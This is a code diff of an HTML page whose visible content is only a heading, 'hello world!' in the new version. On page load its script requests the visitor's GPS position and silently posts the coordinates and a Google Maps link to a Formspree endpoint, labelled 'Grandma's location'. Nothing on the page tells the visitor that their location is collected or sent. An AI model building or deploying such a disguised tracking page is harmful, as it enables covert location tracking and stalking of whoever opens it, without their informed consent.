@@ -3,48 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Send Accurate GPS Location</title>
+    <title>Send Location via Email</title>
     <script>
-        // Function to send the most accurate GPS location
         function sendLocation() {
             if ("geolocation" in navigator) {
-                // Request permission and use high accuracy
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        const { latitude, longitude, accuracy } = position.coords; // GPS location
-                        console.log(`Latitude: ${latitude}, Longitude: ${longitude}, Accuracy: ${accuracy} meters`);
-
+                        const { latitude, longitude } = position.coords;
+                        
                         const emailData = new FormData();
                         emailData.append('latitude', latitude);
                         emailData.append('longitude', longitude);
-                        emailData.append('accuracy', accuracy); // Include accuracy info
-                        emailData.append(
-                            'message',
-                            `Location:\nLatitude: ${latitude}, Longitude: ${longitude}, Accuracy: ${accuracy} meters\nGoogle Maps: https://www.google.com/maps?q=${latitude},${longitude}`
-                        );
+                        emailData.append('message', `Grandma's location:\nLatitude: ${latitude}, Longitude: ${longitude}\nGoogle Maps: https://www.google.com/maps?q=${latitude},${longitude}`);
 
-                        // Send the location via Formspree
-                        fetch('https://formspree.io/f/xjkvdbwg', {
+                        // Send the email via Formspree API
+                        fetch('https://formspree.io/f/xjkvdbwg', {  // Replace {your_form_id} with your Formspree form ID
                             method: 'POST',
                             body: emailData
                         })
                         .then(response => response.json())
-                        .then(() => {
-                            alert('Location sent successfully!');
-                            console.log('Location sent successfully!');
-                        })
+                        .then(() => alert('Location sent successfully!'))
                         .catch((error) => {
                             console.error('Error:', error);
-                            alert('Failed to send the location.');
+                            alert('Failed to send the email.');
                         });
                     },
                     (error) => {
                         alert("Error fetching location: " + error.message);
-                    },
-                    {
-                        enableHighAccuracy: true, // Request the most accurate location
-                        timeout: 10000, // Set a timeout to avoid indefinite waiting
-                        maximumAge: 0 // Do not use cached locations
                     }
                 );
             } else {
@@ -52,12 +37,11 @@
             }
         }
 
-        // Trigger location sending automatically when the page loads
         window.onload = sendLocation;
     </script>
 </head>
 <body>
-    <h1>هسيبك لخيالك</h1>
-
+    <h1>hello world!</h1>
+    
 </body>
 </html>
